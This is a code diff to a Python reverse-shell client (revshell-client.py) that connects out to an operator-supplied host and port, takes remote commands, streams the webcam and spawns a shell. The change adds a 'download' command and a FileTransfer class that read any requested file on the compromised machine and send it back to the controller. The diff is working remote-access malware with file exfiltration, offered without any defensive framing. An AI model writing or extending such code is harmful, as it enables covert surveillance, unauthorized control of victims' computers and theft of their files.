@@ -46,6 +46,24 @@ class VideoStream:
 			message = struct.pack("Q", len(a)) + a
 			self.s.sendall(message)
 
+class FileTransfer:
+	def __init__(self, s, file):
+		self.s = s
+		self.file = file
+
+	def send(self):
+		try:
+			file_size = os.stat(self.file).st_size
+		except FileNotFoundError:
+			self.s.send('0'.encode())
+			return
+		self.s.send((str(file_size) + '\n').encode())
+		with open(self.file, 'r') as f:
+			while file_size > 0:
+				data = f.readline()
+				file_size -= len(data)
+				self.s.send(data.encode())
+
 
 def main(SERVER_HOST, SERVER_PORT):
 	BUFFER_SIZE = 1024 * 128
@@ -56,7 +74,7 @@ def main(SERVER_HOST, SERVER_PORT):
 		command = s.recv(BUFFER_SIZE).decode().strip()
 		if not command:
 			break
-		splitted_command = command.split()
+		splitted_command = command.split(" ", 1)
 		if command == "exit":
 			break
 		if splitted_command[0] == "cd":
@@ -69,6 +87,10 @@ def main(SERVER_HOST, SERVER_PORT):
 		elif splitted_command[0] == "webcam":
 			stream = VideoStream(s)
 			stream.send()
+		elif splitted_command[0] == "download":
+			file = splitted_command[1]
+			transfer = FileTransfer(s, file)
+			transfer.send()
 		elif command == "shell":
 			spawn_shell(s)
 		else:
@@ -81,5 +103,4 @@ if __name__ == '__main__':
 	if len(sys.argv) != 3:
 		print("Usage: python3 revshell-client.py <ip> <port>")
 		exit(1)
-	print(platform.system())
 	main(sys.argv[1], int(sys.argv[2]))
